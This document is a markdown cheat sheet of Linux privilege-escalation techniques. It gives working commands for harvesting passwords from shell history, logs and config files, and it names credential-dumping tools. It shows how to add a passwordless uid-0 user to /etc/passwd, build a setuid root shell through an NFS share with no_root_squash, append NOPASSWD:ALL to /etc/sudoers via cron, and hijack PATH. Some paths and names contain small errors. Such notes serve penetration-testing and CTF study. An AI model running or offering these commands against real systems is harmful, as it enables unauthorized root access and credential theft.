# Linux Privilege Escalation

## Kernel Exploits

Find the kernel version and what distribution for kernel exploit.

You can use these following commands and check in `Exploit DB` (wget, modify, compile and execute).

```sh
uname -a

cat /etc/issue

cat /etc/*-release

cat /etc/lsb-release

cat /etc/redhat-release

lsb-release
```

Some famous Kernel Exploits to do privilege escalation on Linux are `Sendpage` and `Dirtvcow`.

## SUID/GUID

`SUID/GUID` are special permissions to grant users to execute some commands or to carry out certain configurations/operations at administrative level. They can lead to a vertical privilege escalation.

To find files with these permissions you can use these commands:

```sh
find / -user root -perm -4000 2> /dev/null

find / -perm -2000 2> /dev/null
```

If you find a script file with SUID permission `owned` by the `root` and can be `executed` the [gtfobins](gtfobins.github.io) website can be used to find some script to do privilege escalation

## Credentials Stored on System

There are several locations that we can find passwords like:

* log files
* configurations
* memory locations
* etc

Some useful commands:

```sh
history

history | grep -B4 -A3 -i 'passwd\|ssh\|host\|nc\|ping' 2> /dev/null

grep -B3 -A3 -i 'pass\|password\|login\|username\|email\|mail\|host\|ip' /var/log/*.log 2> /dev/null

find / -maxdepth 4 -name "*.conf" -type f -exec grep -Hn 'pass\|password\|login\|username\|email\|mail\|host\|ip' {} \; 2> /dev/null
```

There are simple but powerful `Shell/Python` script used to dump login credentials (Usernames and Passwords) from the current Linux desktop user.

[Mimipenguin](https://github.com/huntergregal/mimipenguin)

Other tools:

[pupy](https://github.com/n1nj4sec/pupy)

[LaZagne](https://github.com/AlessandroZ/LaZagne)

[gimmecredz](https://github.com/0xmitsurugi/gimmecredz)

## Exploiting services running as root

If a specific service is running as a `root` and you can `execute commands` for that program, then you can execute commands as a root.

Search for:

* Webserver
* Database

Example (`MySQL`):

If `MySQL` is running as a `root` and if you can `log in` to the database by your `username` and `password`, you may issue the following command on `MySQL`:

```sh
select sys_eval('whoami')
```

## Escalation Using SUDO

`SUDO` allows users to execute a specific command with an elevated privilege without having to remember the password to sign into the admin account.

    NOPASSWD

### sudo -l

Will show what commands we can execute with sudo

* `(ALL:ALL) ALL`: which means we can execute all commands with sudo
* `(root) NOPASSWD: /usr/bin/vim`: means that we can execute vim with sudo and we `don't need password`

## Writable file owned by root

We can write and use a file to escalate privileges.

In order to find any writable files owned by root. Use with this command (remember to change the `homedir`):

```sh
find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2> /dev/null | grep -v root

find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2> /dev/null | grep root

find / \( -wholename '/home/homedir/' -prune -o -wholename '/proc/*' -prune \) -o \( -type f -perm -0002 \) -exec ls -ld '{}' ';' 2> /dev/null

find /etc -perm -2 -type f 2> /dev/null

find / -writable -type d 2> /dev/null
```

## Writeable /etc/passwd

### Method 1

If you have `write` permission to `/etc/passwd` and `/etc/shadow`, then generate a password with any of these commands:

```sh
# salt as secret1 and password as secret2
openssl passwd -1 -salt secret1 secret2

mkpasswd -m SHA-512 secret

python2 -c 'import crypt;print crypt.crypt("secret", "$6$salt")'
```

Then you can change the `root` hash to `your` new generated hash

Or add the user `youruser` and add the generated password (`$1$secret1$48cmxcj1DAdTrAd3cXTfF/`):

`youruser:$1$secret1$48cmxcj1DAdTrAd3cXTfF/:0:0:Youruser:/root/bin/bash`

### Method 2

Another method is simple, here we do not neet a password to switch user, sometimes this method won't work (when this happens we can use the above method).

```sh
echo 'youruser::0:0::/root:/bin/bash' >> etc/passwd
```

## NFS root squashing

NFS is a Network-attached Storage ([NAS](https://www.redhat.com/en/topics/data-storage/network-attached-storage)) protocol.

The parameter `Root Squashing` (root squash) prevents remote root access to users connected to NFS volume, when connected remote root users allocate a user called `nfsnobody`, which has the least local privileges.

The `No Root Squash` option turn off the `kernel user squash` and allows the connected device access to the remote user root account.

When configuring `NFS` drives system administrator should always use the `root squash` parameter to make sure remote root users are always `squashed`. Otherwise is possible for privilege escalation...

`/etc/exports`: includes settings and permissions for exporting folders/file/system to remote users

Example (`/tmp` can be shared and mounted by remote user):

```sh
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

To exploit:

```sh
Showmount -e 192.168.56.101
```

Create a directory for mounding NFS:

```sh
mkdir /tmp/test
```

Mount the directory:

```sh
mount -o rw,vers=2 192.168.56.101:/tmp /tmp/test
```

Create or copy a shell into the mounted folder, example:

```sh
echo 'int main() {setgid(0);setuid(0);system("/bin/bash");return 0;}' > /mnt/test/shell.c

gcc /mnt/test/shell.c -o /mnt/test/shell
```

Then set suid permission:

```sh
chmod +s /mnt/test/shell
```

Then execute the shell and we will get the access to root shell


## Exploiting Crontab

`Cron` is a work scheduler for operating systems based on Unix. It helps you to schedule regularly run jobs.

Editing crontab:

```sh
crontab -e
```

For listing current running jobs:

```sh
crontab -l
```

There is also a systemwide crontab which can be used by administrators to configure systemwide jobs. The system-wide crontab file location will be `/etc/crontab`

When running `/etc/crontab`, any commands and scripts called by the crontab will be run as root.

If a non-privileged user has `read` `write` permission on that file he can modify that file and gain `Superuser privileges`.

Example (Adding this line to the crontab shell script):

```sh
echo "myuser ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
```

We can spawn a root shell:

```sh
sudo /bin/bash
```

## Exploiting PATH Variable

In Linux and Unix-like Operating System, PATH is a environment variable that specifies all `bin` and `sbin` directories where executable programs are stored.

Find a command with `SUID` or `4000` permission:

```sh
find / -perm -u=s -type f 2> /dev/null
```

When we find the `SUID` protam (source code):

```c
#include <unistd.h>

void main()
{
    setuid(0);
    setgid(0);
    system("ps");
}
```

This program can run the program `ps`, to run the `ps` program the shell will search for the `ps` command in the `PATH` variable.

So we can copy a shell to some directory like `/tmp`:

```sh
cp /bin/sh /tmp/ps
```

And change the `PATH` variable:

```sh
export PATH=/tmp:$PATH
```

And when the program is executed we can spawn a shell.
